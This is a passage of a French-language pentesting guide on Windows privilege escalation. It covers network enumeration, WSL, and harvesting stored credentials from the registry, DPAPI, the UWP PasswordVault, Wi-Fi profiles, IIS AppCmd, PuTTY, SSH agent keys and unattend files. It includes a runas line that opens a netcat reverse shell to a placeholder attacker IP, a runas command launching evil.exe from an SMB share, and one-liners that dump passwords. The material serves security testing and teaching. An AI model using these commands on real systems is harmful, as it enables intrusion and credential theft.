- Désactivez les vérifications facultatives si la bibliothèque le permet (par exemple, certains déploiements de `ws` peuvent éviter la vérification historique de `utf-8-validate` avec `WS_NO_UTF_8_VALIDATE=1`).

## Réseau

### Partages

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### fichier hosts

Vérifiez si d’autres ordinateurs connus sont codés en dur dans le fichier hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfaces réseau et DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ports ouverts

Vérifiez les **services restreints** depuis l’extérieur.

```bash
netstat -ano #Opened ports?
```

Pour un listener local, associez son PID au propriétaire du processus, au chemin de l’exécutable et à tout service ou tâche planifiée qui le démarre. Un service de contrôle à distance ne peut donner accès en tant qu’utilisateur du bureau que si son authentification et ses contrôles de commande le permettent. Une application TCP personnalisée exécutée avec un compte doté de privilèges plus élevés constitue une cible d’analyse distincte : le listener et le chemin du binaire sont des pistes passives, tandis qu’une voie d’exploitation par corruption de mémoire authentifiée nécessite l’analyse de ce binaire précis et de ses entrées accessibles. Si un port exposé semble appartenir à un processus système, comparez-le avec [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) avant d’attribuer le service backend ; une règle de transfert ne prouve pas à elle seule que la destination est accessible ou vulnérable.

### Table de routage

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Table ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Règles du pare-feu

[**Consultez cette page pour les commandes liées au pare-feu**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**

Plus de[ commandes pour l’énumération réseau ici](../basic-cmd-for-pentesters.md#network)

### Sous-système Windows pour Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Le binaire `bash.exe` se trouve également dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez l’accès root, vous pouvez écouter sur n’importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port, une fenêtre graphique vous demandera si `nc` peut être autorisé par le pare-feu).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Pour démarrer facilement bash en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Le compte Linux `root` dans WSL ne confère pas à lui seul des droits d’administrateur Windows. Si l’identité Windows actuelle peut lire le système de fichiers d’une distribution, examinez les fichiers d’historique du shell (y compris `/root/.bash_history`) pour repérer des commandes susceptibles d’avoir enregistré des identifiants ; l’élévation de privilèges nécessite toujours un compte valide disposant de privilèges supérieurs et une méthode d’authentification autorisée. La structure `LocalState\rootfs` concerne les anciennes installations WSL ; WSL 2 stocke généralement la distribution dans un [disque virtuel `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Commencez donc par identifier la distribution et son chemin de stockage réels. Évitez d’afficher le contenu de l’historique lors d’une énumération automatisée.

## Identifiants Windows

### Identifiants Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traitez `DefaultUserName` et `DefaultDomainName` comme des informations sur le contexte du compte, et non comme des identifiants. Une valeur non vide de `DefaultPassword` ou `AltDefaultPassword` constitue une découverte de mot de passe en clair dans le registre. Si `AutoAdminLogon=1`, mais qu’aucun mot de passe en clair n’est lisible, il s’agit uniquement d’une piste : [Sysinternals Autologon peut stocker le mot de passe en tant que secret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), et une lecture ordinaire du registre ne permet pas de déterminer si ce secret existe ni s’il peut être récupéré. Vérifiez les droits d’accès et la configuration réelle de la connexion avant de signaler une exposition d’identifiants.

### Gestionnaire d’identifiants / Windows Vault

D’après [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault stocke les identifiants que **Windows** peut utiliser pour **connecter automatiquement les utilisateurs** à des serveurs, des sites Web et d’autres programmes. À première vue, on pourrait croire que les utilisateurs peuvent y stocker les identifiants de sites comme Facebook, Twitter ou Gmail pour que les navigateurs s’y connectent automatiquement, mais ce n’est pas ainsi que cela fonctionne.

Windows Vault stocke les identifiants que Windows peut utiliser pour connecter automatiquement les utilisateurs. Cela signifie que toute **application Windows ayant besoin d’identifiants pour accéder à une ressource** (un serveur ou un site Web) **peut utiliser Credential Manager** et Windows Vault, et se servir des identifiants fournis au lieu de demander sans cesse aux utilisateurs de saisir leur nom d’utilisateur et leur mot de passe.

À moins que les applications interagissent avec Credential Manager, je ne pense pas qu’elles puissent utiliser les identifiants associés à une ressource donnée. Ainsi, si votre application souhaite utiliser le coffre, elle doit d’une manière ou d’une autre **communiquer avec le gestionnaire d’identifiants et demander les identifiants de cette ressource** dans le coffre de stockage par défaut.

Utilisez `cmdkey` pour répertorier les identifiants stockés sur la machine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Vous pouvez ensuite utiliser `runas` avec l’option `/savecred` pour utiliser les identifiants enregistrés. L’exemple suivant exécute un binaire distant via un partage SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Utiliser `runas` avec des identifiants fournis.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Notez que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou le module Powershell d'[Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Les applications UWP modernes de Windows, Microsoft Edge et les services système modernes stockent les jetons d’authentification et les mots de passe en clair dans le `PasswordVault` de la Universal Windows Platform (UWP) (également exposé sous le nom `Web Credentials` dans `vaultcmd`). Cet espace de stockage est isolé par session et peut être déchiffré nativement sans privilèges administratifs ni droits `SeDebugPrivilege`.

Exécutez cette commande PowerShell dans la session active de l’utilisateur pour dumper et déchiffrer instantanément tous les noms d’utilisateur et mots de passe en clair stockés :

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

La **Data Protection API (DPAPI)** fournit une méthode de chiffrement symétrique des données, principalement utilisée au sein du système d’exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement s’appuie sur un secret utilisateur ou système, qui contribue fortement à l’entropie.

**DPAPI permet de chiffrer des clés au moyen d’une clé symétrique dérivée des secrets de connexion de l’utilisateur**. Dans les scénarios faisant intervenir le chiffrement système, elle utilise les secrets d’authentification de domaine du système.

Les clés RSA utilisateur chiffrées à l’aide de DPAPI sont stockées dans le répertoire `%APPDATA%\Microsoft\Protect\{SID}`, où `{SID}` représente l’[identificateur de sécurité](https://en.wikipedia.org/wiki/Security_Identifier) de l’utilisateur. **La clé DPAPI, qui se trouve avec la clé principale protégeant les clés privées de l’utilisateur dans le même fichier**, se compose généralement de 64 octets de données aléatoires. (Il est important de noter que l’accès à ce répertoire est restreint, ce qui empêche d’en afficher le contenu à l’aide de la commande `dir` dans CMD, mais il est possible de le faire avec PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Vous pouvez utiliser le **module mimikatz** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le déchiffrer.

Les **fichiers d’identifiants protégés par le mot de passe maître** se trouvent généralement dans :

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You pouvez utiliser le **module mimikatz** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\
Vous pouvez **extraire de nombreuses** **masterkeys DPAPI** depuis la **mémoire** avec le module `sekurlsa::dpapi` (si vous êtes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Identifiants PowerShell

Les **identifiants PowerShell** sont souvent utilisés pour les tâches de **script** et d’automatisation afin de stocker facilement des identifiants chiffrés. Ces identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu’ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur que celui où ils ont été créés.

Un identifiant exporté peut avoir un nom de fichier arbitraire ou un chemin `.xml`. Lorsqu’un script ou un inventaire de fichiers en indique un, déterminez le véritable répertoire de profil du compte au lieu de supposer qu’il se trouve dans `C:\Users` : [Windows peut placer les profils ailleurs](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Un fichier lisible n’est qu’un indice ; [Windows `Export-Clixml` associe un identifiant chiffré à l’utilisateur et à l’ordinateur qui l’exportent](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), et tout compte récupéré doit disposer séparément de droits valides sur le service visé. Inspectez d’abord les chemins et les ACL, sans afficher les valeurs chiffrées ou en clair lors d’une énumération courante.

Pour **déchiffrer** des identifiants PS à partir du fichier qui les contient, vous pouvez faire :

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Connexions RDP enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Commandes récemment exécutées

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Gestionnaire d’informations d’identification du Bureau à distance**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Utilisez le module `dpapi::rdg` de **Mimikatz**, avec le `/masterkey` approprié, pour **décrypter les fichiers .rdg**\
Vous pouvez **extraire de nombreuses clés maîtresses DPAPI** de la mémoire avec le module `sekurlsa::dpapi` de Mimikatz

**mRemoteNG utilise un stockage de connexions différent.** Examinez les fichiers XML lisibles dans `%APPDATA%\mRemoteNG` et dans les Documents de l’utilisateur, y compris ceux portant des noms ordinaires comme `config.xml`. Identifiez le schéma des connexions et les attributs `Password` chiffrés avant de considérer un fichier XML comme une piste d’identifiants. La valeur stockée n’est pas un mot de passe DPAPI/RDCMan ; sa récupération dépend des paramètres de chiffrement du fichier et de l’utilisation éventuelle d’un mot de passe maître personnalisé. Évitez d’afficher les valeurs chiffrées lors d’une énumération à grande échelle.

Les exports de profils **Remote Desktop Plus** peuvent également être lisibles dans les répertoires utilisateur ou dans un dossier d’administration partagé. Un export `profiles.xml` ancien contient des entrées `Data/Profile` avec les éléments `ProfileName`, `Password` et `Secure`. Considérez tout élément de mot de passe non vide comme une piste d’identifiants, sans l’afficher ni supposer qu’il s’agit de texte en clair : [le fournisseur indique](https://www.donkz.nl/) que la protection des profils peut être liée au compte et à l’ordinateur utilisés lors de leur création, ou configurée de manière moins stricte. Vérifiez l’origine du fichier et les conditions de récupération avant de vous y fier.

### Sticky Notes

Les utilisateurs se servent souvent de l’application StickyNotes sur les postes de travail Windows pour **enregistrer des mots de passe** et d’autres informations, sans réaliser qu’il s’agit d’un fichier de base de données. Ce fichier se trouve à `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ; il vaut toujours la peine de le rechercher et de l’examiner.

Les utilisateurs enregistrent parfois des mots de passe et d’autres informations dans des applications de notes autocollantes. L’application Sticky Notes empaquetée de Microsoft stocke généralement les notes dans `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ; les applications plus anciennes ou différentes peuvent utiliser d’autres emplacements dans le profil utilisateur, notamment LevelDB. Identifiez l’application installée et le format de stockage avant de conclure qu’il n’y a pas de notes parce que le fichier SQLite est absent.

Si Sticky Notes utilise le journal des écritures anticipées (WAL) de SQLite, une copie de `plum.sqlite` seule peut ne pas contenir les notes récemment validées. Conservez le fichier `plum.sqlite-wal` correspondant avec une copie cohérente de la base de données, et incluez `plum.sqlite-shm` s’il est disponible ; l’index de mémoire partagée peut être reconstruit, mais le WAL fait partie de l’état persistant de la base de données. Consultez [la documentation WAL de SQLite](https://www.sqlite.org/wal.html). Une note contenant un nom de compte ou un mot de passe n’est qu’une piste d’identifiants : vérifiez séparément le compte, les accès autorisés et la réutilisation du mot de passe. Un enregistrement chiffré provenant d’un gestionnaire de mots de passe nécessite également sa véritable clé de déchiffrement et une interprétation propre à l’application avant de pouvoir établir l’existence d’une connexion avec des privilèges supérieurs.

### AppCmd.exe

**Notez que pour récupérer les mots de passe d’AppCmd.exe, vous devez être Administrateur et l’exécuter avec un niveau High Integrity.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\
Si ce fichier existe, il est possible que des **identifiants** aient été configurés et puissent être **récupérés**.

Ce code a été extrait de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) :

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Vérifiez si `C:\Windows\CCM\SCClient.exe` existe .\
Les programmes d’installation sont **exécutés avec les privilèges SYSTEM**, beaucoup sont vulnérables au **DLL Sideloading (informations provenant de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Fichiers et registre (identifiants)

### Artefacts d’identifiants dans le registre des outils de support

Certaines anciennes installations de support à distance conservent des noms de valeurs liés aux mots de passe sous des clés de registre d’application fixes. Par exemple, `SecurityPasswordAES` de TeamViewer désignait un mot de passe de session statique configuré dans les versions antérieures à la version 9, selon l'[explication du fournisseur sur la clé de registre](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Un nom de valeur est seulement une piste à examiner : vérifiez la version installée, les données de valeur lisibles, le format et le comportement d’authentification actuel avant d’évaluer cet identifiant. Passer d’un mot de passe de support à distance à un compte Windows plus privilégié nécessite également que le mot de passe soit effectivement réutilisé et que l’accès à ce compte soit autorisé. N’incluez pas le texte chiffré ni les mots de passe récupérés dans les résultats d’énumération habituels.

### Feuilles de calcul partagées avec feuilles protégées

Si l’on soupçonne un classeur partagé lisible de contenir des données de compte, distinguez le **chiffrement du fichier** de la protection de feuille de calcul ou des colonnes masquées. [Microsoft indique](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) que la protection d’une feuille de calcul contrôle les modifications et ne constitue pas une fonctionnalité de sécurité ; elle ne prouve pas à elle seule que le contenu du classeur est chiffré. N’examinez que les fichiers autorisés et pertinents, et évitez d’afficher des secrets potentiels lors d’une énumération étendue. Un chemin `.xlsx` lisible, une feuille protégée ou une colonne masquée ne prouve à lui seul ni l’existence d’identifiants ni le fait qu’un compte dispose de privilèges supérieurs ; vérifiez séparément les données réelles et les droits actuels du compte.

### Correctifs de modifications conservés par le serveur CI

Un serveur CI peut conserver les modifications de code source soumises dans son répertoire de données, même après la fin du build. [TeamCity documente](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` comme emplacement de stockage des modifications apportées lors d’exécutions à distance ; le répertoire de données peut être configuré et ne se trouve pas nécessairement sous `ProgramData`. Un correctif lisible peut conserver des références supprimées ou ajoutées à un fichier d’identifiants, une clé de chiffrement ou un script qui utilise les deux. Par exemple, un workflow PowerShell utilisant `ConvertTo-SecureString -Key` nécessite la clé AES ainsi que la chaîne chiffrée ; [Microsoft indique](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) que la clé est fournie séparément. Commencez par examiner uniquement les noms de correctifs accessibles, puis inspectez le contenu pertinent avec autorisation, sans afficher de secrets dans les résultats d’énumération habituels. Un chemin de correctif, une valeur chiffrée ou une référence à une clé ne prouve à lui seul ni la validité d’un identifiant ni l’accès à des privilèges supérieurs. Limitez les ACL du répertoire de données et évitez d’intégrer des secrets aux modifications de build.

### Rotation personnalisée du mot de passe de l’administrateur local

Un outil maison de rotation de mots de passe peut stocker un mot de passe d’administrateur local chiffré dans un service local, tout en conservant les identifiants de son datastore dans un fichier `.env` lisible ou à côté du binaire de mise à jour. Examinez ensemble la tâche planifiée du programme de mise à jour, son compte, les ACL de sa configuration, son listener et les permissions du datastore. Un datastore limité à loopback reste accessible à un utilisateur local disposant d’identifiants valides, mais l’authentification ne prouve pas à elle seule qu’il a le droit de lire les enregistrements concernés. Si le seed de chiffrement ou le matériel de clé est accessible à côté du texte chiffré, examinez précisément la dérivation de clé avant de faire confiance au chiffrement. Un schéma qui dérive de manière déterministe une clé AES à partir d’un seed exposé à l’aide de Go [`math/rand`](https://pkg.go.dev/math/rand) ne convient pas à la protection de ce mot de passe ; Go indique que ce package n’est pas adapté à la génération d’aléa sensible à la sécurité. Vérifiez que tout mot de passe récupéré est actuel et appartient à un compte du groupe Administrators local avant de le considérer comme une voie d’escalade. Une tâche planifiée, un chemin `.env` ou un blob chiffré ne prouve aucune de ces conditions à lui seul. N’incluez pas les mots de passe ni le matériel de clé dans les résultats d’énumération habituels.

Utilisez [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) pour gérer les mots de passe d’administrateur local. Son stockage dans l’annuaire ou Entra et ses contrôles d’accès sont distincts d’un datastore local personnalisé ; les [rôles Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) déterminent également si un utilisateur authentifié du datastore peut lire un index spécifique.

### Archives de plugins de serveurs Java et réutilisation d’identifiants

Certains plugins de serveurs Java sont distribués sous forme d’archives JAR dans le répertoire `plugins` d’un serveur. Un plugin personnalisé lisible peut contenir une configuration ou du bytecode intégrant un identifiant de service. N’examinez l’archive qu’avec autorisation et ne divulguez pas les secrets récupérés dans les résultats d’énumération habituels. Un chemin de plugin ne prouve pas à lui seul l’existence d’un secret, et un mot de passe de service récupéré ne permet d’obtenir des privilèges supérieurs que s’il est également valide pour un compte plus privilégié. Vérifiez les ACL des fichiers concernés et remplacez les identifiants réutilisés par des secrets distincts. Consultez le [guide d’installation des plugins de PaperMC](https://docs.papermc.io/paper/adding-plugins/) pour la structure des répertoires et la [documentation JAR d’Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) pour le contenu des archives.

### Identifiants de la base de données intégrée d’Openfire

Une installation Openfire utilisant sa base de données intégrée peut conserver `openfire.script` sous `Openfire\embedded-db`. Si le compte actuel peut le lire, examinez ensemble les enregistrements `OFUSER` et la propriété `passwordKey`. La [documentation du fournisseur d’utilisateurs](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) d’Openfire indique que les mots de passe peuvent être stockés en texte brut ou chiffrés à l’aide d’une clé conservée dans cette propriété. Un mot de passe récupéré n’est pertinent pour une escalade que s’il est toujours valide pour une identité plus privilégiée ; le nom du fichier ne prouve ni l’accès en lecture ni la réutilisation d’identifiants. Le chemin est une piste d’inventaire : ne divulguez pas le contenu de la base de données ni les identifiants dans les résultats d’énumération habituels.

Le fichier distinct `Openfire\conf\openfire.xml` peut révéler les ports configurés et l’interface d’écoute de la console d’administration, même si une base de données externe est utilisée. Openfire lie généralement sa console d’administration à loopback ; un compte local peut tout de même atteindre l’adresse si le listener est actif. Vérifiez ensemble le listener réel, le rôle d’administrateur autorisé, la stratégie de téléversement des plugins et l’identité du service Openfire. Un administrateur autorisé à installer un plugin peut faire exécuter le code du plugin dans le contexte du service, qui peut disposer de privilèges élevés si le service s’exécute en tant que LocalSystem. Un mot de passe correspondant à un compte ou un chemin de configuration lisible ne prouve à lui seul ni l’accès à la console d’administration ni l’exécution de code. Consultez le [guide du fournisseur sur l’installation et la gestion des plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) et la [propriété de l’API de téléversement des plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuration d’un serveur de gestion forensique

Les configurations du serveur Velociraptor, généralement nommées `server.config.yaml`, peuvent contenir `CA.private_key` de l’AC interne. Si un utilisateur moins privilégié peut lire cette clé, il peut être en mesure de générer un certificat client d’API. La possibilité d’obtenir ainsi des privilèges supérieurs dépend des rôles utilisateur du serveur, de l’accessibilité de l’API et de l’identité sous laquelle le serveur ou l’agent cible s’exécute. Une configuration client contient des éléments différents ; en trouver une ne prouve pas l’accès à l’AC du serveur. Certains déploiements conservent la clé privée de l’AC hors ligne ; une configuration serveur lisible peut donc ne pas contenir la clé de signature.

Sur un serveur Windows, inspectez les ACL de la configuration **du serveur** dans son répertoire d’installation ainsi que celles des copies de sauvegarde protégées. Un emplacement possible est `%ProgramFiles%\VelociraptorServer\server.config.yaml` ; utilisez le chemin configuré pour le service s’il est différent. Vérifiez que l’identité actuelle peut lire le fichier et que `CA.private_key` est bien présent. Évitez d’afficher la clé privée dans les journaux ou les résultats d’énumération. Le workflow `config api_client` du fournisseur utilise la clé de l’AC pour émettre un certificat client, mais un rôle effectif côté serveur est également nécessaire ; en créer un ou le modifier peut nécessiter un accès en écriture au datastore ou un redémarrage. Une identité serveur privilégiée déjà existante peut offrir une voie d’accès même si ces modifications ne sont pas possibles. Les requêtes API disposant de droits d’exécution s’exécutent dans le contexte du serveur ou de l’agent concerné, qui peut être fortement privilégié.

Protégez la configuration du serveur et ses sauvegardes avec des ACL restrictives, conservez si possible la clé de signature de l’AC hors ligne et limitez les rôles API ainsi que l’accès au listener. Consultez la [documentation de l’API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) et les [recommandations de configuration de sécurité](https://docs.velociraptor.app/docs/deployment/security/).

### Identifiants PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY est un gestionnaire de sessions distinct. Son stockage natif chiffré peut se trouver dans `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, tandis qu’une sauvegarde de sessions exportée peut s’appeler `sessions-backup.dat` et être stockée ailleurs. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) indique que les exports sont chiffrés par mot de passe et peuvent contenir des sessions, des clés, des scripts, des tags et des relations ; son [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) indique l’emplacement du stockage natif. Vérifiez d’abord les permissions et les chemins d’accès. Trouver l’un de ces fichiers ne révèle pas son mot de passe et ne prouve pas qu’un identifiant enregistré est toujours valide ou qu’il dispose de privilèges supérieurs.

### Clés d’hôte SSH de PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Clés SSH dans le registre

Les clés privées SSH peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys` ; vous devriez donc vérifier si elle contient quelque chose d'intéressant :

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Si vous trouvez une entrée dans ce chemin, il s’agit probablement d’une clé SSH enregistrée. Elle est stockée sous forme chiffrée, mais peut être facilement déchiffrée à l’aide de [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Plus d’informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Si le service `ssh-agent` n’est pas en cours d’exécution et que vous souhaitez qu’il démarre automatiquement au démarrage, exécutez :

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Il semble que cette technique ne soit plus valide. J’ai essayé de créer des clés ssh, de les ajouter avec `ssh-add` et de me connecter à une machine via ssh. La clé de registre HKCU\Software\OpenSSH\Agent\Keys n’existe pas et procmon n’a pas détecté l’utilisation de `dpapi.dll` lors de l’authentification par clé asymétrique.

### Fichiers sans surveillance

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Vous pouvez également rechercher ces fichiers avec **metasploit** : _post/windows/gather/enum_unattend_

Exemple de contenu :

```xml
